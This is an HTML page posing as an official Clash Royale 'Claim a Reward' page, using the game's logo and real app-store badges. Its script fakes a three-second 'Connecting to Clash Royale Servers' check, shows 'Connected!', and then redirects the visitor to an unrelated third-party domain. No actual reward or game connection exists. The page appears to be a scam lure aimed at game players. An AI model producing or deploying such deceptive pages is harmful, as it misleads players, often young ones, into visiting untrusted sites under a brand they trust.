    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clash Royale - Claim Reward</title>
    <!-- Added a Google Font backup -->
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
    
    <style>
        /* --- 1. CUSTOM FONT LOADING --- */
        @font-face {
            font-family: 'ClashFont';
            src: url('font.ttf'); 
        }

        /* --- CSS Reset & Base Styles --- */
        :root {
            --accent-yellow: #f1c40f;
            --accent-yellow-dark: #d4ac0d;
            --text-color: #ffffff;
            --font-family: 'ClashFont', 'Lilita One', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: var(--font-family);
            
            /* Background Settings */
            background-color: #0f1f3a; 
            background-image: url('https://i.postimg.cc/52LmgP49/a2fb230ac13e58c9232bc22892220593-(1).png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;

            color: var(--text-color);
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            overflow-x: hidden;
            text-align: center;
            padding: 20px;
        }

        /* --- 2. SMOOTH SHADOW AT TOP --- */
        .top-shadow-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 250px;
            background: linear-gradient(to bottom, rgba(10, 20, 40, 0.95), transparent);
            pointer-events: none;
            z-index: 5;
        }

        /* --- Main Content Area --- */
        main {
            position: relative;
            z-index: 10;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            width: 100%;
            max-width: 600px;
            animation: fadeIn 0.8s ease-out;
        }

        /* Logo Styling */
        .logo-container {
            margin-bottom: 20px;
            position: relative;
        }

        .logo-img {
            width: 280px;
            max-width: 90%;
            height: auto;
            display: block;
            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.7));
            animation: float 3s ease-in-out infinite;
        }

        /* Headline Text */
        .headline {
            font-size: 1.8rem;
            font-weight: 800;
            line-height: 1.2;
            color: #fff;
            margin-bottom: 40px;
            
            /* STROKE AND SHADOW */
            -webkit-text-stroke: 1.5px #000; 
            text-shadow: 4px 4px 0px #000;
            paint-order: stroke fill; 
        }

        /* --- Yellow Button (Claim Reward) --- */
        .btn-claim {
            background-color: var(--accent-yellow);
            color: #2b1d0e; 
            font-size: 1.5rem;
            font-weight: 800;
            text-transform: uppercase;
            padding: 18px 48px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 
                0 6px 0 var(--accent-yellow-dark), 
                0 15px 20px rgba(0,0,0,0.5); 
            transition: all 0.1s ease;
            text-shadow: 0 1px 0 rgba(255,255,255,0.4);
            position: relative;
            overflow: hidden;
            font-family: var(--font-family);
        }

        .btn-claim:hover {
            transform: translateY(-2px);
            box-shadow: 
                0 8px 0 var(--accent-yellow-dark),
                0 20px 25px rgba(0,0,0,0.6);
            filter: brightness(1.05);
        }

        .btn-claim:active {
            transform: translateY(4px);
            box-shadow: 
                0 0 0 var(--accent-yellow-dark),
                0 5px 10px rgba(0,0,0,0.4);
        }

        /* --- Footer / Download Section --- */
        footer {
            position: relative;
            z-index: 10;
            margin-bottom: 30px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
        }

        .download-label {
            font-size: 0.9rem;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 700;
            color: #fff;

            /* STROKE AND SHADOW FOR LABEL */
            -webkit-text-stroke: 1px #000;
            text-shadow: 2px 2px 0px #000;
            paint-order: stroke fill;
        }

        .store-buttons {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            justify-content: center;
        }

        /* Store Badge Styling */
        .store-btn {
            background-color: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #fff;
            display: flex;
            align-items: center;
            padding: 10px 20px;
            border-radius: 8px;
            text-decoration: none;
            transition: transform 0.2s, background-color 0.2s;
        }

        .store-btn:hover {
            transform: scale(1.05);
            background-color: rgba(0, 0, 0, 0.8);
        }

        .store-icon {
            width: 28px;
            height: 28px;
            margin-right: 12px;
            fill: white;
        }

        .store-text {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            line-height: 1.1;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-shadow: none;
            -webkit-text-stroke: 0;
        }

        .store-text span:first-child {
            font-size: 0.7rem;
            text-transform: uppercase;
        }

        .store-text span:last-child {
            font-size: 1.1rem;
            font-weight: 600;
        }

        /* --- Custom Toast Notification --- */
        .toast {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(-150px);
            background-color: #ffffff; 
            color: #000000;
            padding: 15px 25px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center; 
            gap: 12px;
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 1000;
            width: auto; 
            max-width: 90%; 
            font-family: var(--font-family); 
            border: 2px solid #000;
        }

        .toast.show {
            transform: translateX(-50%) translateY(0);
        }

        /* Icon Container to hold both spinner and checkmark */
        .toast-icon-wrapper {
            width: 24px;
            height: 24px;
            position: relative;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Checkmark */
        .checkmark {
            font-size: 1.5rem;
            color: #27ae60;
            display: none; /* Hidden by default when loading */
        }

        /* Loader/Spinner */
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #27ae60; /* Green spinner */
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            display: block; /* Visible by default */
        }

        /* States controlled by JS */
        .toast.is-loading .loader { display: block; }
        .toast.is-loading .checkmark { display: none; }
        
        .toast.is-connected .loader { display: none; }
        .toast.is-connected .checkmark { display: block; }

        /* Text Styling */
        .toast-message-text {
            color: #000000 !important; 
            font-size: 1rem !important;
            line-height: 1.2;
            text-align: left;
            text-shadow: none !important;
            -webkit-text-stroke: 0 !important;
        }

        /* Animations */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Mobile Adjustments */
        @media (max-width: 480px) {
            .logo-img {
                width: 220px;
            }
            .headline {
                font-size: 1.4rem;
            }
            .btn-claim {
                font-size: 1.2rem;
                padding: 15px 35px;
            }
            .toast {
                width: 85%;
                flex-direction: column; 
                text-align: center;
            }
        }
    </style>
</head>
<body>

    <!-- Smooth Shadow Overlay at the Top -->
    <div class="top-shadow-overlay"></div>

    <!-- Notification Toast (Hidden by default) -->
    <div id="toast" class="toast is-loading">
        <div class="toast-icon-wrapper">
            <div class="loader"></div>
            <span class="checkmark">âœ“</span>
        </div>
        <span class="toast-message-text">Connecting to Clash Royale Servers</span>
    </div>

    <!-- Main Content -->
    <main>
        <!-- Header / Logo -->
        <div class="logo-container">
            <img src="https://i.postimg.cc/7PTWVTm1/clash-royale-logo1.png" alt="Clash Royale Logo" class="logo-img">
        </div>

        <!-- Sub-headline -->
        <h1 class="headline">Claim a Reward in Clash Royale</h1>

        <!-- Action Button -->
        <button class="btn-claim" onclick="claimReward()">Claim a Reward</button>
    </main>

    <!-- Footer / Downloads -->
    <footer>
        <div class="download-label">Download the Game</div>
        <div class="store-buttons">
            <!-- Apple App Store Button -->
            <a href="https://apps.apple.com/fr/app/clash-royale/id1053012308" class="store-btn" aria-label="Download on the App Store">
                <svg class="store-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.21-1.96 1.07-3.11-1.05.05-2.31.71-3.06 1.61-.69.8-1.26 2.02-1.1 3.11 1.17.09 2.36-.84 3.09-1.61"/>
                </svg>
                <div class="store-text">
                    <span>Download on the</span>
                    <span>App Store</span>
                </div>
            </a>

            <!-- Google Play Store Button -->
            <a href="https://play.google.com/store/apps/details?id=com.supercell.clashroyale&pcampaignid=web_share" class="store-btn" aria-label="Get it on Google Play">
                <svg class="store-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M3,20.5V3.5C3,2.91,3.34,2.39,3.84,2.15L13.69,12L3.84,21.85C3.34,21.6,3,21.09,3,20.5M16.81,15.12L6.05,21.34L14.54,12.85L16.81,15.12M20.3,13.1L21.56,12.39C21.83,12.24,22,11.96,22,11.65C22,11.34,21.83,11.06,21.56,10.91L20.3,10.2L17.69,12.81L20.3,13.1M16.81,8.88L14.54,11.15L6.05,2.66L16.81,8.88Z"/>
                </svg>
                <div class="store-text">
                    <span>GET IT ON</span>
                    <span>Google Play</span>
                </div>
            </a>
        </div>
    </footer>

    <script>
        // Logic to handle the button click
        function claimReward() {
            const toast = document.getElementById('toast');
            const msgText = document.querySelector('.toast-message-text');
            
            // 1. RESET: Ensure we start in loading state
            toast.classList.remove('is-connected');
            toast.classList.add('is-loading');
            msgText.innerText = "Connecting to Clash Royale Servers";

            // 2. SHOW: Display the toast
            toast.classList.add('show');

            // 3. WAIT 3 SECONDS: Then switch to connected state
            setTimeout(() => {
                // Change icon to checkmark
                toast.classList.remove('is-loading');
                toast.classList.add('is-connected');
                
                // Update text to confirm connection
                msgText.innerText = "Connected!";

                // 4. WAIT 0.8 SECONDS (so user sees the checkmark), THEN REDIRECT
                setTimeout(() => {
                    window.location.href = 'https://plaiovagames.site/cl/i/6nn5nj';
                }, 800);

            }, 3000); // The 3 seconds connecting time
        }
    </script>
</body>
</html>
